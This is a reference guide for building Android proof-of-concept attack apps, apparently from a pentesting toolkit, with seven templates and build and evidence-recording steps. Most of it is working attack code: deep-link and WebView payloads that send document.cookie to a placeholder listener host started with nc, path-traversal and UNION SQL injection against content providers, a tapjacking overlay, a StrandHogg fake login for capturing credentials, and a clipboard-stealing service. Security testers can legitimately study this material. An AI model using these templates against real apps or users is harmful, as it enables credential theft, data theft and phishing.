# PoC App Creation Reference

**When to build a PoC app vs ADB-only PoC**
**Full templates for 7 attack types + CLI build pipeline**
**All PoC attempts logged to braindump/poc_log.md**

## Table of Contents
1. [When to Build PoC App vs ADB-Only](#decision)
2. [Build Environment Setup](#setup)
3. [PoC App Scaffold](#scaffold)
4. [Template: Deep Link Parameter Injection](#deeplink)
5. [Template: Intent Hijacking](#intent-hijack)
6. [Template: Malicious Content Provider](#provider)
7. [Template: Tapjacking](#tapjacking)
8. [Template: Task Hijacking (StrandHogg)](#strandhog)
9. [Template: WebView XSS](#webview-xss)
10. [Template: Clipboard Theft](#clipboard)
11. [Build, Sign, Deploy Pipeline](#build)
12. [Record Evidence with scrcpy](#evidence)

---

## 1. When to Build PoC App vs ADB-Only <a name="decision"></a>

| Attack | ADB-Only | PoC App Required |
|--------|----------|-----------------|
| Exported activity launch | `am start` | Optional (cleaner demo) |
| Deep link injection | `am start -d` | Optional |
| Intent fuzzing | `am start --es` | Optional |
| Content provider query | `content query` | Optional |
| Tapjacking | No | **Required** — needs overlay |
| Task hijacking | No | **Required** — needs launchMode |
| Intent hijacking (pending) | No | **Required** — needs receiver registration |
| Clipboard theft | Via Frida | **Required** — needs background service |
| Custom Intent filters | Partial | **Required** — needs explicit registration |

**Rule:** Use ADB when proof requires only sending — use PoC app when proof requires receiving, rendering, or persisting.

---

## 2. Build Environment Setup <a name="setup"></a>

```bash
# Option A: Android Studio (full IDE)
# Download: https://developer.android.com/studio

# Option B: Command-line only
sudo apt install -y gradle openjdk-17-jdk android-sdk

# Set ANDROID_HOME
export ANDROID_HOME=$HOME/android-sdk
export PATH=$PATH:$ANDROID_HOME/tools:$ANDROID_HOME/platform-tools

# Accept licenses
sdkmanager --licenses

# Install build tools
sdkmanager "build-tools;34.0.0" "platforms;android-34"

# Verify
gradle --version
javac -version
```

---

## 3. PoC App Scaffold <a name="scaffold"></a>

```bash
# Create minimal PoC project structure
mkdir poc-[ATTACK_TYPE] && cd poc-[ATTACK_TYPE]
mkdir -p app/src/main/{java/com/poc,res/{layout,values,xml}}

# settings.gradle
cat > settings.gradle << 'EOF'
rootProject.name = "poc"
include ':app'
EOF

# build.gradle (root)
cat > build.gradle << 'EOF'
buildscript {
    repositories { google(); mavenCentral() }
    dependencies { classpath 'com.android.tools.build:gradle:8.1.0' }
}
EOF

# app/build.gradle
cat > app/build.gradle << 'EOF'
apply plugin: 'com.android.application'

android {
    compileSdkVersion 34
    defaultConfig {
        applicationId "com.poc"
        minSdkVersion 21
        targetSdkVersion 34
        versionCode 1
        versionName "1.0"
    }
    buildTypes {
        release { minifyEnabled false }
    }
}

dependencies {
    implementation 'androidx.appcompat:appcompat:1.6.1'
}
EOF

# gradle wrapper
gradle wrapper --gradle-version 8.0
```

---

## 4. Template: Deep Link Parameter Injection <a name="deeplink"></a>

**Goal:** Demonstrate that target app's deep link handler does not validate parameters

```xml
<!-- app/src/main/AndroidManifest.xml -->
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.poc">
    <application android:label="DeepLinkPoC">
        <activity android:name=".MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
    </application>
</manifest>
```

```java
// app/src/main/java/com/poc/MainActivity.java
package com.poc;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Fire deep link with injected parameter
        String targetScheme = "[SCHEME]";
        String targetHost = "[HOST]";
        String targetPath = "/[PATH]";
        
        // Payload: path traversal / XSS / redirect
        String payload = "'%20OR%201=1--";  // SQL injection example
        // String payload = "<script>alert(document.cookie)</script>";
        // String payload = "javascript:fetch('http://[BURP_IP]/'+document.cookie)";
        // String payload = "http://evil.com";  // open redirect
        
        String url = targetScheme + "://" + targetHost + targetPath + "?param=" + payload;
        Log.d("POC", "Firing: " + url);
        
        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
        finish();
    }
}
```

```bash
# Run via ADB instead (simpler) [BOTH]
adb shell am start -a android.intent.action.VIEW \
  -d "[SCHEME]://[HOST]/[PATH]?param=INJECTION_PAYLOAD"
```

---

## 5. Template: Intent Hijacking <a name="intent-hijack"></a>

**Goal:** Register receiver that captures implicit intents from target app

```xml
<!-- AndroidManifest.xml - add to application block -->
<receiver android:name=".IntentHijackReceiver" android:exported="true">
    <intent-filter android:priority="999">
        <action android:name="[TARGET_ACTION]"/>
        <!-- Match the action the vulnerable app broadcasts -->
    </intent-filter>
</receiver>
```

```java
// IntentHijackReceiver.java
package com.poc;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class IntentHijackReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        // Log all extras
        Log.d("POC_HIJACK", "Intent received: " + intent.getAction());
        if (intent.getExtras() != null) {
            for (String key : intent.getExtras().keySet()) {
                Log.d("POC_HIJACK", key + " = " + intent.getExtras().get(key));
            }
        }
        // Can also abort ordered broadcasts:
        // abortBroadcast();
    }
}
```

```bash
# Logcat to capture hijacked data [BOTH]
adb logcat | grep POC_HIJACK
```

---

## 6. Template: Malicious Content Provider <a name="provider"></a>

**Goal:** Demonstrate content provider path traversal / SQL injection

```bash
# ADB-only approach (preferred) [BOTH]
# Path traversal
adb shell content read \
  --uri "content://[TARGET_PACKAGE].provider/root/../../../data/data/[TARGET_PACKAGE]/databases/main.db"

# SQL injection in query
adb shell content query \
  --uri "content://[TARGET_AUTH]/users" \
  --where "1=1 UNION SELECT name,sql,NULL FROM sqlite_master--"
```

```java
// PoC app version: FileProviderExploit.java
package com.poc;

import android.app.Activity;
import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import java.io.InputStream;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Attempt file read via vulnerable FileProvider
        String targetAuthority = "[TARGET_PACKAGE].provider";
        // Path traversal to read arbitrary file
        Uri uri = Uri.parse("content://" + targetAuthority + 
            "/root/../../../data/data/[TARGET_PACKAGE]/shared_prefs/auth.xml");
        
        try {
            ContentResolver cr = getContentResolver();
            InputStream is = cr.openInputStream(uri);
            byte[] buffer = new byte[4096];
            int read = is.read(buffer);
            String content = new String(buffer, 0, read);
            Log.d("POC_PROVIDER", "FILE CONTENT:\n" + content);
        } catch (Exception e) {
            Log.e("POC_PROVIDER", "Failed: " + e.getMessage());
        }
        
        // Attempt SQL injection via content query
        Uri queryUri = Uri.parse("content://[TARGET_AUTH]/users");
        try {
            Cursor c = cr.query(queryUri, null, 
                "1=1 UNION SELECT name,sql,NULL FROM sqlite_master--", 
                null, null);
            while (c != null && c.moveToNext()) {
                Log.d("POC_SQLI", "Row: " + c.getString(0) + " | " + c.getString(1));
            }
        } catch (Exception e) {
            Log.e("POC_SQLI", "SQLi failed: " + e.getMessage());
        }
    }
}
```

---

## 7. Template: Tapjacking <a name="tapjacking"></a>

**Goal:** Overlay transparent window over target app UI to capture taps

```xml
<!-- AndroidManifest.xml - requires SYSTEM_ALERT_WINDOW permission -->
<uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
<application>
    <activity android:name=".TapjackActivity" android:exported="true"
        android:theme="@android:style/Theme.Translucent.NoTitleBar">
        ...
    </activity>
</application>
```

```java
// TapjackActivity.java
package com.poc;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.view.MotionEvent;
import android.view.WindowManager;
import android.util.Log;

public class TapjackActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Request overlay permission (Android 6+)
        if (!Settings.canDrawOverlays(this)) {
            startActivity(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:" + getPackageName())));
            return;
        }
        
        // Set transparent overlay on top
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
            android.graphics.PixelFormat.TRANSLUCENT
        );
        
        android.view.View overlay = new android.view.View(this) {
            @Override
            public boolean onTouchEvent(MotionEvent e) {
                Log.d("POC_TAP", "Tap captured at: " + e.getX() + "," + e.getY()
                    + " action=" + e.getAction());
                // Forward tap to underlying app (optional)
                return true;  // consume tap without forwarding = pure tapjack
            }
        };
        
        // First launch target app, then overlay
        Intent targetIntent = getPackageManager()
            .getLaunchIntentForPackage("[TARGET_PACKAGE]");
        startActivity(targetIntent);
        
        getWindowManager().addView(overlay, params);
    }
}
```

---

## 8. Template: Task Hijacking (StrandHogg) <a name="strandhog"></a>

**Goal:** PoC app with same taskAffinity as target, positioned to appear after resume

```xml
<!-- AndroidManifest.xml -->
<activity
    android:name=".FakeActivity"
    android:taskAffinity="[TARGET_PACKAGE]"
    android:allowTaskReparenting="true"
    android:launchMode="singleTask"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
</activity>
```

```java
// FakeActivity.java - phishing UI that mimics target app
package com.poc;

import android.app.Activity;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.util.Log;

public class FakeActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // Inflate fake login UI mimicking [TARGET_PACKAGE]
        // setContentView(R.layout.fake_login);
        
        // When user "logs in" to fake UI:
        Log.d("POC_STRAND", "StrandHogg: credentials captured");
        // Then launch real target to avoid detection
        startActivity(getPackageManager()
            .getLaunchIntentForPackage("[TARGET_PACKAGE]"));
        finish();
    }
}
```

---

## 9. Template: WebView XSS <a name="webview-xss"></a>

**Goal:** Demonstrate JavaScript execution in target WebView via deep link

```bash
# ADB approach (often sufficient) [BOTH]
# If target loads URL from deep link parameter:
adb shell am start -a android.intent.action.VIEW \
  -d "[SCHEME]://webview?url=javascript:alert(document.domain)"

# More impactful payload — data exfiltration:
PAYLOAD="javascript:fetch('http://[BURP_IP]:4444/?c='+document.cookie)"
adb shell am start -a android.intent.action.VIEW \
  -d "[SCHEME]://webview?url=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))")"

# Start listener
nc -lvnp 4444

# Verify via logcat:
adb logcat | grep -E 'WebView|javascript|XSS'
```

---

## 10. Template: Clipboard Theft <a name="clipboard"></a>

```bash
# Via Frida (easiest) [BOTH]
# clipboard-monitor.js already in subskills/frida/ scripts
frida -U -f [TARGET_PACKAGE] -l scripts/frida/clipboard-monitor.js --no-pause

# Via ADB broadcast (Clipper app required on device) [BOTH]
adb install clipper.apk
adb shell am broadcast -a clipper.get

# Via PoC app [UNROOTED]
```

```java
// ClipboardTheftService.java
package com.poc;

import android.app.Service;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

public class ClipboardTheftService extends Service {
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        ClipboardManager cm = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
        cm.addPrimaryClipChangedListener(() -> {
            if (cm.hasPrimaryClip()) {
                String text = cm.getPrimaryClip().getItemAt(0).getText().toString();
                Log.d("POC_CLIP", "Clipboard: " + text);
                // Send to attacker server:
                // new Thread(() -> { /* HTTP POST */ }).start();
            }
        });
        return START_STICKY;
    }
    @Override public IBinder onBind(Intent i) { return null; }
}
```

---

## 11. Build, Sign, Deploy Pipeline <a name="build"></a>

```bash
# Build debug APK [BOTH]
cd poc-[ATTACK_TYPE]/
./gradlew assembleDebug

# Output: app/build/outputs/apk/debug/app-debug.apk

# Build release (for StrandHogg / visible app) [BOTH]
./gradlew assembleRelease
zipalign -v 4 app/build/outputs/apk/release/app-release-unsigned.apk \
  app-poc-aligned.apk
apksigner sign --ks ~/.android/debug.keystore \
  --ks-key-alias androiddebugkey \
  --ks-pass pass:android --key-pass pass:android \
  app-poc-aligned.apk

# Install [BOTH]
adb install -r app/build/outputs/apk/debug/app-debug.apk

# Launch [BOTH]
adb shell am start -n com.poc/.MainActivity

# Uninstall after test [BOTH]
adb uninstall com.poc
```

---

## 12. Record Evidence with scrcpy <a name="evidence"></a>

```bash
# Always record PoC with scrcpy [BOTH]
mkdir -p evidence

# Record PoC demonstration
scrcpy --record evidence/poc-[ATTACK_TYPE]-$(date +%Y%m%d-%H%M%S).mp4 &
SCRCPY_PID=$!

# Run the PoC
adb shell am start -n com.poc/.MainActivity
# ... perform exploitation steps ...

# Stop recording
kill $SCRCPY_PID

# Take screenshot at key moment [BOTH]
adb exec-out screencap -p > evidence/screenshot-$(date +%Y%m%d-%H%M%S).png

# Capture logcat evidence [BOTH]
adb logcat -d | grep -E 'POC_|[TARGET_PACKAGE]' > evidence/logcat-$(date +%Y%m%d-%H%M%S).txt

# Log to braindump
cat >> braindump/poc_log.md << EOF

## PoC: [ATTACK_TYPE] $(date '+%Y-%m-%d %H:%M:%S')
**Target:** [TARGET_PACKAGE]
**Command:** adb shell am start -n com.poc/.MainActivity
**Result:** [SUCCESS/FAIL]
**Evidence:**
- Video: evidence/poc-[ATTACK_TYPE]-$(date +%Y%m%d-%H%M%S).mp4
- Screenshot: evidence/screenshot-$(date +%Y%m%d-%H%M%S).png
- Logcat: evidence/logcat-$(date +%Y%m%d-%H%M%S).txt
EOF
```
